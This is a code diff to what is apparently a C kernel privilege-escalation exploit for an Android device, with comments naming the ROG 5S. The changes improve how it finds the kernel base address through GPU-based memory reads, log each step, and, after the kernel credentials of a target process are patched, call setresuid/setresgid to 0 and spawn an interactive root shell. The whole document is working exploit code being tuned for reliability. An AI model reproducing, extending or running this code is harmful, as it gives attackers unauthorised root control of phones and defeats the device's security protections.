@@ -1361,9 +1361,21 @@ static void safe_cred_patch(void)
 shell:
     gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent
     __sync_synchronize();
+
+    // Explicitly confirm root state in child context before exec
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
+
     fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
+    fprintf(stderr, "[CHILD %d] Verified identity: ", getpid());
     fflush(stderr);
+    system("id"); // Real-time check
     
+    // Set environment for root
+    setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp", 1);
+    setenv("TERM", "xterm", 1);
+    setenv("HOME", "/data/local/tmp", 1);
+
     // Use execl for a cleaner shell transition
     execl("/system/bin/sh", "sh", "-i", NULL);
     
@@ -1517,14 +1529,16 @@ static uint64_t find_kernel_base_auto(void)
     if (task_va)
     {
         base = find_kernel_base_from_task_va(task_va);
-        if (base)
+        if (base) {
+            fprintf(stderr, "[KBASE] Dynamic discovery SUCCESS: 0x%lx\n", (unsigned long)base);
             return base;
+        }
     }
 
     uint64_t standard_bases[] = {
+        0xffffffc010000000ULL, // Most common for ROG 5S
         0xffffffc000000000ULL,
         0xffffffc008200000ULL,
-        0xffffffc010000000ULL,
         0xffffffc020000000ULL,
         0xffffffc030000000ULL,
         0xffffffc035000000ULL,
@@ -1535,11 +1549,14 @@ static uint64_t find_kernel_base_auto(void)
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, standard_bases[i], elf_magic, 4) == 0)
         {
-            if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F')
+            if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
+                fprintf(stderr, "[KBASE] Standard base MATCH: 0x%lx\n", (unsigned long)standard_bases[i]);
                 return standard_bases[i];
+            }
         }
     }
 
+    fprintf(stderr, "[KBASE] [!] FAILED to find kernel base automatically!\n");
     return 0;
 }
 
@@ -2589,11 +2606,20 @@ restart:;
     reap_all_children();
     usleep(200000);
 
+    // Final check if target is still alive (no gbuf reset here, just log)
+    if (kill(target_pid, 0) != 0) {
+        fprintf(stderr, "[!] Warning: Target PID %d not responding to signal 0, but proceeding...\n", target_pid);
+    }
+
     // 2. NOW PERFORM PATCHING with free memory
     fprintf(stderr, "\n    [!] AUTOMATIC PATCHING TRIGGERED for PID %d...\n", target_pid);
     parent_patch_root(fd, target_cred_ptr);
+    
+    // Signal the child to activate
+    gbuf[0] = 0xab;
+    __sync_synchronize();
 
-    fprintf(stderr, "[+] Patching sequence complete. Proceeding to root shell...\n"); 
+    fprintf(stderr, "[+] Patching sequence complete. Waiting for shell...\n"); 
 
     fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
     
